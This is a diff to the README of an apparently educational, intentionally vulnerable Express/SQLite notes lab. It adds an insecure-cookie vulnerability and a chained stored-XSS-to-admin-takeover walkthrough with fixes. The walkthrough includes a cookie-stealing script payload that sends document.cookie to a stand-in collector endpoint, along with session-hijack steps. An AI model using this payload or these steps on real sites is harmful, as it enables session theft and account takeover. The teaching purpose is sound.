@@ -3,9 +3,10 @@
 > ⚠️ **For educational use only.** Contains intentional security vulnerabilities.
 > Never deploy this outside a local/sandboxed environment.
 
-A minimal notes app (Node.js/Express + SQLite) built to demonstrate three
-real-world web vulnerabilities from the OWASP Top 10, each with a working
-exploit and a fix path.
+A minimal notes app (Node.js/Express + SQLite) built to demonstrate four
+real-world web vulnerabilities from the OWASP Top 10 — plus a chained
+attack that combines two of them into a full account takeover — each with
+a working exploit and a fix path.
 
 ## Setup
 
@@ -103,27 +104,94 @@ if (note.owner_id !== req.session.user.id) {
 
 ---
 
+## Vulnerability 4: Insecure Session Cookie Configuration
+
+**Where:** `server.js`, session middleware config
+
+**Root cause:** The session cookie is explicitly set to `httpOnly: false`:
+```js
+app.use(session({ ..., cookie: { httpOnly: false } }));
+```
+This means client-side JavaScript (including an attacker's injected script)
+can read `document.cookie` and see the session ID. With the default
+`httpOnly: true`, cookies are invisible to JS entirely.
+
+**Fix:** Remove the override (or explicitly set `httpOnly: true`), and add
+`secure: true` when served over HTTPS so cookies are also unreadable
+over unencrypted connections.
+
+---
+
+## Chained Attack: Stored XSS → Cookie Theft → Session Hijack → Admin Takeover
+
+This is the "so what" that ties vulns #2 and #4 together into a real
+account-takeover path, and demonstrates attacker thinking beyond isolated
+bug-hunting.
+
+**Scenario:** `bob` (a normal user) wants admin access but doesn't know
+admin's password.
+
+1. Bob posts a note to the shared **Community Board** (`/board` — visible
+   to every logged-in user, including admin) containing:
+   ```html
+   <script>fetch("/steal?c="+document.cookie)</script>
+   ```
+2. When admin logs in and views `/board`, the script executes in admin's
+   browser. Because the session cookie isn't `httpOnly`, the script can
+   read it via `document.cookie` and send it to `/steal` — an endpoint
+   standing in for an attacker-controlled collector server.
+3. Bob checks `/collector` and retrieves admin's stolen session cookie.
+4. Bob replaces his own `connect.sid` cookie with the stolen one and
+   requests `/admin`.
+5. The server has no way to tell the difference between admin's real
+   browser and bob's forged request — same valid session ID, same
+   access. Bob is now looking at the admin panel, having never touched
+   admin's password.
+
+**Run the full chain yourself:**
+```bash
+node server.js &
+bash exploit_chain.sh
+```
+
+**Fix (defense in depth — any one of these breaks the chain):**
+- Escape output on `/board` and `/notes/:id` (fixes the XSS entry point)
+- Set `httpOnly: true` on the session cookie (script can no longer read it
+  even if XSS exists)
+- Add CSP headers restricting inline `<script>` execution
+- Bind sessions to IP/User-Agent and rotate session IDs on privilege-
+  sensitive actions, so a copied cookie alone isn't sufficient
+
+---
+
 ## Report Notes (for the writeup)
 
 **Problem statement:** Many small/internal web apps ship with these exact
-mistakes; raw SQL concatenation, unescaped template output, and missing
-authorization checks; because they're easy to overlook and don't break
-functionality during normal use. This lab reproduces all three in a
-realistic, minimal app to demonstrate impact and remediation.
+mistakes — raw SQL concatenation, unescaped template output, missing
+authorization checks, and misconfigured session cookies — because each one
+individually seems low-risk and doesn't break normal functionality. This
+lab reproduces all four in a realistic, minimal app, and shows how two of
+them combine into something worse than the sum of their parts: a full,
+password-free admin takeover.
 
 **How it works:** Standard Express app with session-based auth and a
-SQLite-backed notes feature. Each vulnerability lives in a single, clearly
-commented location for demo/teaching purposes.
+SQLite-backed notes feature, plus a shared community board that any user
+(including admin) can view. Each vulnerability lives in a single, clearly
+commented location for demo/teaching purposes; `exploit_chain.sh` walks
+through the combined attack end-to-end against a running instance.
 
-**Features implemented:** login/logout, per-user note creation, note
-viewing, SQLite persistence.
+**Features implemented:** login/logout, per-user note creation and viewing,
+a shared public board, an admin-only panel, SQLite persistence, an
+automated exploit-chain script.
 
 **Limitations:** single demo session secret (not production-safe even
-after fixing the 3 vulns), no CSRF protection, no rate limiting on login,
+after fixing all 4 vulns), no CSRF protection, no rate limiting on login,
 no password hashing even post-fix (would need bcrypt added separately),
-not built for concurrent multi-user production load.
+the "collector" endpoint is folded into the same app rather than a
+genuinely separate attacker server, not built for concurrent multi-user
+production load.
 
 **Future improvements:** add a "patched" branch/mode toggle to demo
 before/after side-by-side, add CSRF tokens, add password hashing + rate
-limiting, add a 4th vuln (e.g. insecure direct file access) for extra
-creativity points.
+limiting, add session rotation on login to further harden against hijack
+even after cookie theft.
